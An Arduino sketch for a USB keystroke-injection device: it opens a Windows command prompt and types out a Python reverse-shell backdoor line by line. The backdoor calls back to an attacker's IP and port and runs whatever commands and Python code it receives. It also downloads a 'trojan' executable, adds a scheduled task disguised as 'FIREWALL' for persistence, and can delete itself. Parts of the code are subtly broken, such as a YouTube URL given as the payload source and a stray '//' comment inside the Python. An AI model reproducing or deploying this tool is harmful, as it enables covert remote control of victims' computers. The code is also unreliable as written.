void setup() {
  Keyboard.begin();
  delay(10000);//延时
  Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.print('r');
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(200); 
  //=========================Run==========================
  Keyboard.println("CMD");
  delay(1000);
 
  Keyboard.println("ECHO import socket >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import base64 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import sys >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import binascii >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import os >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import re >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import threading >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import time >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO from StringIO import StringIO >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO import requests >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO class clients: >> PyShell.py");
  delay(100); 
  Keyboard.println("ECHO 	"""Client of PythonShell >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	""" >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	def __init__(self,client_address): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		self.client_address=client_address >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		self.main() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	def request_client(self): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		连接服务端 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		try: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			path=os.getcwd() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)   #创建一个socket对象 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.client.connect(self.client_address)                   #连接服务端 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.contents=binascii.b2a_hex(base64.b64encode(self.contents+'*'+path)) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.client.send(self.contents) #发送数据 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		except: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			sys.exit() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	def kill(self): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		kill project >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		os.popen('kill.bat').read() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	def exits(self): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		exit project >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		os._exit(0) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	def response_client(self): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		客户端处理服务端命令函数 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		try: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			response=self.client.recv(409600) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		except: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			sys.exit() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		else: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			response=base64.b64decode(binascii.a2b_hex(response.strip())) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			try: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 				if response=='exit':  #退出当前连接！！ >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					sys.exit() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 				if response=='kill':  #退出当前连接并自毁程序！！ >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					try: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						f=open('kill.bat','w') >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						f.write('ping -n 2 127.0.0.1 >nul\ndel /F PyShell.exe\ndel /F kill.bat') >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						f.close() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						threading.Thread(target=self.kill).start() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						time.sleep(0.5) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						threading.Thread(target=self.exits).start() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					except: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						pass >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 				if response=='playtask':        #给自己创建计划任务！ >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					try: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						path=os.getcwd() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						name=os.popen('whoami').read().split('\\')[1].replace('\n','')  #获取当前用户名称 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						command='schtasks.exe  /Create /RU '+'"'+name+'"'+' /SC MINUTE /MO 30 /TN FIREWALL /TR '+'"'+path+\'\\PyShell.exe\'+'"'+' /ED 2016/12/12'#可执行文件一定要写绝对路径  >> PyShell.py");
  delay(100); 
  Keyboard.println("ECHO 						#以上这条为添加一条计划任务的命令！！！ >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						self.contents=os.popen(command).read() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					except: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						pass >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 				else: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					i='-p' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					if i in response: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						lists=response.split('-p') >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						response=lists[1] >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						sys.stdout=result=StringIO() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						exec(response)                      #执行python脚本文件 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						self.contents=result.getvalue() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 					else: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						self.contents=response.split('cd ') >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						m=re.search(self.res,response) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						if m: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 							m=m.group() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						else: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 							m='.' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						if len(self.contents)>1: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 							os.chdir(self.contents[1].strip())          #切换目录，popen('cd ../')只能切换子目录，父目录改不了 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 							self.contents=' ' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 						else: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 							self.contents=os.popen(self.contents[0]).read()   #执行普通的cmd命令 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 							os.chdir(m) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			except: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 				self.contents=' ' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 				pass >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.client.close() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	def main(self): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		self.contents=' ' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		self.res=r'[A-Za-z]:' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		while True: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.request_client() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 			self.response_client() >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO def mains(): >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	从控制台接收参数，执行相应的代码（Client or Server） >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	''' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	url = 'https://www.youtube.com/watch?v=aDwCCUfNFug'    //自定义下载木马网址 >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO     r = requests.get(url) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO     with open('PyShell.exe', 'wb') as f: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         f.write(r.content) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	if len(sys.argv)>2: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		ip=str(sys.argv[1]) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		port=int(sys.argv[2]) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		address_all=(ip,port) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		clients(address_all) >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print '[HELP]  PyShell.exe [ip] [port]' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print '[HELP]  python PyShell.py [ip] [port]' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print u'connection：' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print u'[HELP]  exit    ----退出连接' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print u'[HELP]  kill    ----退出连接并自毁程序' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print u'[HELP]  playtask    ----创建计划任务' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO         print u'[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 	else: >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print '[HELP]  PyShell.exe [ip] [port]' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print '[HELP]  python PyShell.py [ip] [port]' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print u'connection：' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print u'[HELP]  exit    ----退出连接' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print u'[HELP]  kill    ----退出连接并自毁程序' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print u'[HELP]  playtask    ----创建计划任务' >> PyShell.py");
  delay(100);
  Keyboard.println("ECHO 		print u'[HELP]  python -p file.py    ----在肉鸡上执行本地python脚本' >> PyShell.py");
  delay(100);

  Keyboard.println("python PyShell.py [ip] [port]");  //输入自己的IP及端口，在攻击者电脑上执行服务器脚本，等待目标连接
  delay(2000);
    Keyboard.press(KEY_LEFT_GUI);
  delay(200); 
  Keyboard.print('r');
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  delay(200);
  Keyboard.println('CMD');
  delay(600);
  Keyboard.println('EXIT');
  //======================================================
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}

void loop() {
}
